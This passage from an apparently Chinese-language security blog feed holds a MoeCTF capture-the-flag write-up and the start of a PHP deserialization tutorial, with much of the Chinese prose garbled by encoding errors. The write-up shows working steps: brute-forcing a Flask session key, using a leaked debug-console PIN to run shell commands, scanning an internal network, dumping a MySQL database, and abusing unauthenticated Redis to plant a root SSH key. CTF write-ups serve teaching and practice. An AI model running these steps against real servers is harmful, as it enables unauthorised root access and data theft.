&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret keyÊòØ<code>This-random-secretKey-you-can&#39;t-get06f0</code>,Êúâ‰∫Üsecret keyÂ∞±ËÉΩËá™Â∑±‰øÆÊîπsession‰∏∫admin„ÄÇadminÁöÑprivateÁïôË®ÄËØ¥pinÁ†Å904-474-531ÔºåÊâÄ‰ª•ÂéªÂà∞<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ÔºåËæìÂÖ•pinÁ†ÅÂàôËé∑Âæóconsole</p><p>ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§Ôºö</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>Ëé∑ÂæóÁ¨¨‰∏ÄÈÉ®ÂàÜflagÔºö<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>ËøòÊúâ‰∏™readmeÔºåpython decodeÂêéÁúãÂà∞ÊèêÁ§∫</p><pre class="language-none"><code class="language-none">ÊÅ≠Âñú‰Ω†ÈÄöËøáÂ§ñÁΩëÊ∏óÈÄèÊãø‰∏ã‰∫ÜÊú¨Âè∞ÊúçÂä°Âô®ÁöÑÊùÉÈôêÊé•‰∏ãÊù•Ôºå‰Ω†ÈúÄË¶ÅÂ∞ùËØïÂÜÖÁΩëÊ∏óÈÄèÔºåÊú¨ÊúçÂä°Âô®ÁöÑ&#x2F;app&#x2F;toolsÁõÆÂΩï‰∏ãÂÜÖÁΩÆ‰∫Üfscan‰Ω†ÈúÄË¶Å‰∫ÜËß£ÂÆÉÁöÑÂü∫Êú¨Áî®Ê≥ïÔºåÁÑ∂ÂêéÊâ´ÊèèÂÜÖÁΩëÁöÑipÊÆµÂ¶ÇÊûú‰Ω†ËøõË°å‰∫ÜÊ≠£Á°ÆÁöÑÊìç‰ΩúÔºå‰ºöÂæóÂà∞Á±ª‰ºº‰∏ãÈù¢ÁöÑÁªìÊûú10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 openÂ∞Ü‰Ω†ÂæóÂà∞ÁöÑËã•Âπ≤‰∏™Á´ØÂè£Âè∑‰ªéÂ∞èÂà∞Â§ßÊéíÂ∫èÂπ∂‰ª• - ÂàÜÂâ≤ÔºåËøô‰∏Ä‰∏≤Âç≥‰∏∫hint.zipÂéãÁº©ÂåÖÁöÑÂØÜÁ†ÅÔºàÊú¨‰æã‰∏≠ÔºåÂØÜÁ†Å‰∏∫Ôºö22-8080-9000ÔºâÊ≥®ÊÑèÔºöËØ∑ÂøΩÁï•Êéâxx.xx.xx.1Ôºå‰æãÂ¶ÇÊâ´Âá∫‰∏â‰∏™ip 192.168.0.1 192.168.0.2 192.168.0.3 ÔºåËØ∑ÂøΩÁï•ÊéâÊúâÂÖ≥192.168.0.1ÁöÑÊâÄÊúâÁªìÊûúÔºÅÊ≠§‰∏∫Âá∫È¢ò‰∫∫ÊúçÂä°Âô®‰∏äÁöÑÂÖ∂ÂÆÉÊ≠£Â∏∏ÊúçÂä°ÂØπÂØÜÁ†ÅÊúâÁñëÈóÆÈöèÊó∂Âí®ËØ¢Âá∫È¢ò‰∫∫</code></pre><p>ÊèêÁ§∫Áî®fscanÔºåÁúã‰∏Ä‰∏ãhelp</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ÊòØËøô‰∏™Â∑•ÂÖ∑Ôºö <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>Áúã‰∏Ä‰∏ãÊú¨Êú∫ÂÜÖÁΩëip, ÂèÇËÄÉ <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>ÂæóÂà∞ip‰∏∫<code>172.21.0.2</code>„ÄÇÊâ´ÊèèÔºö</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ÂæóÂà∞hint.zipÂØÜÁ†ÅÔºö 22-3306-6379-8080</p><p>ÁÑ∂Âêé‰∏çË¶ÅÂç°Âú®ÊÄé‰πàÈÖçÁΩÆfrpËøõË°åÂÜÖÁΩëÁ©øÈÄèÔºåÈÇ£‰∏™Ë¶ÅËá™Â∑±ÂºÄvpsÔºåÊàñËÄÖË¶ÅÊúâ‰∏™Ëá™Â∑±ÁöÑÂÖ¨ÁΩëip„ÄÇÁ©øÈÄèÂè™ÊòØËæÖÂä©ÊïàÊûúÔºåÂ∏ÆÂä©Êàë‰ª¨Ê∏óÈÄèÊõ¥Âä†Êñπ‰æøÔºå‰∏çÈÖçÁΩÆÁõ¥Êé•Áî®python console‰πüÊòØÂèØ‰ª•ÁöÑ„ÄÇ‰πü‰∏çË¶ÅÊÉ≥Áî®ngrokÂÖçË¥πÁâàÔºåÂÖçË¥πÁâàÂè™ËÉΩËΩ¨Âèë‰∏Ä‰∏™Á´ØÂè£ÔºåËÄåÁ©øÈÄèËá≥Â∞ëË¶Å‰∏§‰∏™Á´ØÂè£„ÄÇÁõ¥Êé•ÂéªÊêûmysqlÔºö</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ÂæóÂà∞sqlÊï∞ÊçÆÂ∫ì‰∫§‰∫íÁöÑÊ∫êÁ†ÅÔºåÈáåÈù¢ÊúâÁî®Êà∑ÂêçÂíåÂØÜÁ†Å„ÄÇËøûÊé•:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>Êü•ÂÜÖÂÆπÔºö</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ÊúÄÂêéÊòØredis„ÄÇÁî®pythonË£Ö‰∏™redisÊ®°ÂùóÔºà‰∏çÁü•ÈÅì‰∏∫Âï•apt-get installË£Ö‰∏ç‰∫ÜÔºüÔºâÔºö</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ÁÑ∂ÂêéËøûÊé•</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>‰ªéinfo‰∏≠ÂæóÁü•redisÂ≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û„ÄÇÊ†πÊçÆ https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html ÂæÄrootÂÜôssh key„ÄÇpublic_keyÂíåprivkeyÂà©Áî®<code>ssh-keygen -t rsa</code>ÁîüÊàê</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>ÂèÇËÄÉ <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ÔºåÂÆâË£ÖparamikoËøõË°åsshËøûÊé•</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p> <strong>Flag</strong></p><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-php_unserialize</title>
      <link href="/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/"/>
      <url>/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p><a href="https://hello-ctf.com/HC_Web/php_unser_base/">PHP Â∫èÂàóÂåñÂèäÂèçÂ∫èÂàóÂåñÂü∫Á°Ä</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">ÂèçÂ∫èÂàóÂåñÂ≠¶‰π†Á¨îËÆ∞</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHPÂèçÂ∫èÂàóÂåñÊÄªÁªì</a></p><h4 id="È≠îÊúØÊñπÊ≥ï"><a href="#È≠îÊúØÊñπÊ≥ï" class="headerlink" title="È≠îÊúØÊñπÊ≥ï"></a>È≠îÊúØÊñπÊ≥ï</h4><p>Âú® PHP ÁöÑÂ∫èÂàóÂåñ‰∏≠ÔºåÈ≠îÊúØÊñπÊ≥ïÔºàMagic MethodsÔºâÊòØ‰∏ÄÁªÑÁâπÊÆäÁöÑÊñπÊ≥ïÔºåËøô‰∫õÊñπÊ≥ï‰ª•Âèå‰∏ãÂàíÁ∫øÔºà<code>__</code>Ôºâ‰Ωú‰∏∫ÂâçÁºÄÔºåÂèØ‰ª•Âú®ÁâπÂÆöÁöÑÂ∫èÂàóÂåñÈò∂ÊÆµËß¶Âèë‰ªéËÄå‰ΩøÂºÄÂèëËÄÖËÉΩÂ§üËøõ‰∏ÄÊ≠•ÁöÑÊéßÂà∂ Â∫èÂàóÂåñ &#x2F; ÂèçÂ∫èÂàóÂåñ ÁöÑËøáÁ®ã„ÄÇ</p><p>‰Ω†ÂèØ‰ª•Âú® PHP ÂÆòÊñπÊñáÊ°£‰∏≠Êü•ÊâæÂà∞ÂØπÂ∫îÈ≠îÊúØÊñπÊ≥ïÁöÑÂÆö‰πâÂíå‰ΩøÁî®ÊñπÊ≥ïÔºö<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: È≠îÊúØÊñπÊ≥ï - Manual</a></p><p>‰∏ÄËà¨Âú®È¢òÁõÆ‰∏≠Â∏∏ËßÅÁöÑÂá†‰∏™ÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ ÊâßË°åunserialize()Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- ÊâßË°åserialize()Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- ÂØπË±°Ë¢´ÈîÄÊØÅÊó∂Ëß¶Âèë</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-------- Âú®ÂØπË±°‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-- Âú®ÈùôÊÄÅ‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- Áî®‰∫é‰ªé‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄßËØªÂèñÊï∞ÊçÆÊàñËÄÖ‰∏çÂ≠òÂú®Ëøô‰∏™ÈîÆÈÉΩ‰ºöË∞ÉÁî®Ê≠§Ê≥ï</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- Áî®‰∫éÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- Âú®‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß‰∏äË∞ÉÁî®isset()Êàñempty()Ëß¶Âèë</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- Âú®‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß‰∏ä‰ΩøÁî®unset()Êó∂Ëß¶Âèë</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- ÊääÁ±ªÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ëß¶Âèë</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ ÂΩìÂ∞ùËØïÂ∞ÜÂØπË±°Ë∞ÉÁî®‰∏∫ÂáΩÊï∞Êó∂Ëß¶Âèë</span></code></pre><p>‰∏Ä‰ªΩÊØîËæÉÂÖ®Èù¢ÁöÑË°®Ê†ºÔºö</p><table><thead><tr><th align="left">magicMethods</th><th align="left">attribute</th></tr></thead><tbody><tr><td align="left">__construct</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´ÂàõÂª∫Êó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂàùÂßãÂåñÂØπË±°ÁöÑÂ±ûÊÄß„ÄÇ</td></tr><tr><td align="left">__destruct</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´ÈîÄÊØÅÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÈáäÊîæÂØπË±°Âç†Áî®ÁöÑËµÑÊ∫ê„ÄÇ</td></tr><tr><td align="left">__call</td><td align="left">Âú®ÂØπË±°‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Âä®ÊÄÅÊñπÊ≥ïË∞ÉÁî®„ÄÇ</td></tr><tr><td align="left">__callStatic</td><td align="left">Âú®ÈùôÊÄÅ‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Âä®ÊÄÅÈùôÊÄÅÊñπÊ≥ïË∞ÉÁî®„ÄÇ</td></tr><tr><td align="left">__get</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°ÁöÑÂ±ûÊÄßË¢´ËØªÂèñÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Â±ûÊÄßÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ</td></tr><tr><td align="left">__set</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°ÁöÑÂ±ûÊÄßË¢´ËÆæÁΩÆÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Â±ûÊÄßÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ</td></tr><tr><td align="left">__isset</td><td align="left">ÂΩì‰ΩøÁî® isset() Êàñ empty() ÊµãËØï‰∏Ä‰∏™ÂØπË±°ÁöÑÂ±ûÊÄßÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Â±ûÊÄßÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ</td></tr><tr><td align="left">__unset</td><td align="left">ÂΩì‰ΩøÁî® unset() Âà†Èô§‰∏Ä‰∏™ÂØπË±°ÁöÑÂ±ûÊÄßÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Â±ûÊÄßÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ</td></tr><tr><td align="left">__toString</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´ËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤Êó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞ÂØπË±°ÁöÑÂ≠óÁ¨¶‰∏≤Ë°®Á§∫„ÄÇ</td></tr><tr><td align="left">__invoke</td><td align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´‰Ωú‰∏∫ÂáΩÊï∞Ë∞ÉÁî®Êó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞ÂØπË±°ÁöÑÂèØË∞ÉÁî®ÊÄß„ÄÇ</td></tr><tr><td align="left">__set_state</td><td align="left">ÂΩì‰ΩøÁî® var_export() ÂØºÂá∫‰∏Ä‰∏™ÂØπË±°Êó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞ÂØπË±°ÁöÑÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ„ÄÇ</td></tr><tr><td align="left">__clone</td><td 